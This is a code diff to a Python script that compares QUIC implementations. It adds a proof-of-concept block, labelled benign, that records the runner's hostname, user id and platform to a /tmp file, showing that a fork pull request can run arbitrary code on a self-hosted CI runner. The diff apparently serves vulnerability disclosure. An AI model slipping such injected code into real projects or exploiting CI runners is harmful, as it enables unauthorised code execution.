@@ -406,6 +406,21 @@ def run(cfg, tmp):
 
 def main():
     """Parse arguments, run all comparisons, and write the results tables."""
+    # SECURITY POC (benign, no exfiltration): this script is run verbatim from
+    # the PR checkout on a self-hosted runner (perfcompare.yml). Executing it
+    # proves arbitrary code execution on the runner from a fork pull request.
+    import platform as _platform
+    _marker = Path("/tmp/neqo-security-poc-marker-py")
+    try:
+        _marker.write_text(
+            "hostname={}\nuser={}\nplatform={}\n".format(
+                __import__("socket").gethostname(),
+                __import__("os").getuid(),
+                _platform.platform(),
+            )
+        )
+    except Exception:
+        pass
     p = argparse.ArgumentParser(description="Compare QUIC implementations")
     p.add_argument("--host", default="127.0.0.1")
     p.add_argument("--port", type=int, default=4433)
